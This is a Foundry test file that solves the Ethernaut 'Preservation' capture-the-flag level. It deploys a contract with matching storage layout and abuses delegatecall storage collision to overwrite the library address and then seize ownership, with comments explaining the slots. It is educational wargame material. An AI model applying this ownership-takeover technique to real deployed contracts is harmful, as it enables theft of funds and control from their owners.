// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/16-Preservation/PreservationFactory.sol";
import "../src/Ethernaut.sol";

contract Delegator {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 time) public {
        owner = address(uint160(time));
    }
}

contract PreservationTest is Test {
    Ethernaut ethernaut;
    address playerAddress = address(6529);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(playerAddress, 1 ether);
    }

    function testPreservation() public {
        // Level Setup
        PreservationFactory preservationFactory = new PreservationFactory();
        ethernaut.registerLevel(preservationFactory);
        vm.startPrank(playerAddress);
        address levelAddress = ethernaut.createLevelInstance(preservationFactory);
        Preservation ethernautPreservation = Preservation(payable(levelAddress));

        // Level Attack
        /* delegatecall info here:
        https://docs.soliditylang.org/en/v0.8.15/introduction-to-smart-contracts.html?highlight=delegatecall#delegatecall-callcode-and-libraries
        https://solidity-by-example.org/delegatecall
        https://solidity-by-example.org/hacks/delegatecall

        Preservation contract storage layout
        slot0 -> timeZone1Library
        slot1 -> timeZone2Library
        slot2 -> owner
        slot3 -> storedTime

        `delegatecall` using the caller's context means the `LibraryContract` will modify the `storedTime` variable (Slot 0)
        with our Delegator contract. It will modify that variable in the Preservation contract and not in the LibraryContract

        Delegator contract has all storage layout exactly like the Preservation contract so, when we call the function again
        with our attack contract we can replace the owner address
        */
        Delegator attack = new Delegator();
        // Replacing the time address with out attack contract
        uint timeWithAddress = uint256(uint160(address(attack)));
        emit log_named_address("Attack Address", address(attack));
        emit log_named_bytes32("timeWithAddress", bytes32(timeWithAddress));
        ethernautPreservation.setFirstTime(timeWithAddress);
        emit log_named_address("New Preservation timeZone1Library Address", ethernautPreservation.timeZone1Library());
        // timeZone1Library address is now address of the Delegator contract, so now should pass uint256 with owner address
        timeWithAddress = uint256(uint160(playerAddress));
        ethernautPreservation.setFirstTime(timeWithAddress);
        emit log_named_address("New Preservation owner", ethernautPreservation.owner());

        // Level Submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}